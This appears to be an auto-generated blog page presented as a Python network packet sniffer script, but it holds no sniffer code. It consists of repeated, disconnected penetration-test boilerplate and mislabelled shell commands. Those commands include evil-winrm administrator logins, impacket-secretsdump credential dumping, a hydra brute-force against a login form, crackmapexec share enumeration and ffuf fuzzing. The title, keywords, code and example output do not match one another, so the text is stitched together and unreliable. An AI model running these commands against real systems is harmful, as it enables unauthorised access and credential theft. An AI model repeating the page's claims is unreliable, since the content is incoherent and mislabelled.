---
TitleSEO: "Network Packet Sniffer in Python | ZureFX"
TitlePost: "Network Packet Sniffer — Python"
Author: "ZureFX"
Description: "A Python script for network packet sniffer. Built for security research and automation."
Keywords: "rust, parser, tool, python"
URL: "https://zurefx.github.io/scripting/script-network-packet-sniffer-399.html"
URL_IMAGES: ""
Date: "2024-01-08"
Tags: "Rust, Parser, Tool, Python"
Section: "scripting"
Lang: "en"
main_img: "script-network-packet-sniffer-399"
Permalink: "/scripting/script-network-packet-sniffer-399.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Authentication bypass was achieved through careful manipulation of the login mechanism. Lateral movement was facilitated by reusing discovered credentials across services. Lateral movement was facilitated by reusing discovered credentials across services.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `netcat`
- `gobuster`
- `secretsdump`

## Implementation

### Core Logic

The service was running without proper input validation, leading to injection vulnerabilities. Initial enumeration revealed several interesting open ports on the target.

```python
evil-winrm -i 10.63.142.245 -u administrator -p 'P@ssw0rd!'
```

Unconstrained delegation was enabled on the compromised machine. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Helper Functions

The scheduled task ran with elevated privileges and could be abused for escalation. The service account had excessive permissions assigned in Active Directory.

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.57.245.112/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.74.42.170
```

## Usage

### Basic Usage

Lateral movement was facilitated by reusing discovered credentials across services. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.50.3.101 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.129.111.119 -u administrator -p 'P@ssw0rd!'
```

### Advanced Options

Network traffic analysis revealed unencrypted communications containing user credentials. The service was running without proper input validation, leading to injection vulnerabilities. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
crackmapexec smb 10.67.57.222 -u administrator -p 'P@ssw0rd!' --shares
```

## Output

### Example Output

Weak file permissions allowed modification of critical system files. The database credentials were hardcoded in the application source code.

```
[+] Scanning target...
[+] Found 11 results
[+] Done in 17.73s
```
